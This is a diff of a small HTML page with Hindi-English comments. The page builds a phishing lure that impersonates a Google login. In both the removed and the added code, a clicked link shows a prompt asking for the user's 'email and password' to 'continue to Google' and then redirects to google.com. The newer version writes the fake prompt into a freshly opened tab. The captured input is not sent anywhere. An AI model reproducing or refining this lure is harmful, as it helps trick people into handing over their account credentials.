@@ -1,18 +1,31 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      function exploit() {
-        // Prompt box aayega, user input ya cancel kar sakta hai
-        prompt("To continue to Google\nPlease login with your email and password:", "Email / Password");
-        
-        // Prompt ke baad Google khul jayega chahe input ho ya na ho
-        window.location.href = "https://www.google.com";
-      }
-    </script>
+<body>
 
-    <a href="#" onclick="exploit(); return false;">
-      <h1>Click here to go to Google.com</h1>
-    </a>
-  </body>
+<script>
+  function openPromptTab() {
+    // Naya tab me apna prompt page kholenge
+    const newTab = window.open('', '_blank');
+
+    // Us new tab me ye content dalenge:
+    newTab.document.write(`
+      <html>
+      <body>
+        <script>
+          const userInput = prompt("To continue to Google\\nPlease login with your email and password:", "Email / Password");
+          window.location.href = "https://www.google.com";
+        <\/script>
+      </body>
+      </html>
+    `);
+
+    newTab.document.close();
+  }
+</script>
+
+<a href="#" onclick="openPromptTab(); return false;">
+  <h1>Open prompt and Google in new tab</h1>
+</a>
+
+</body>
 </html>
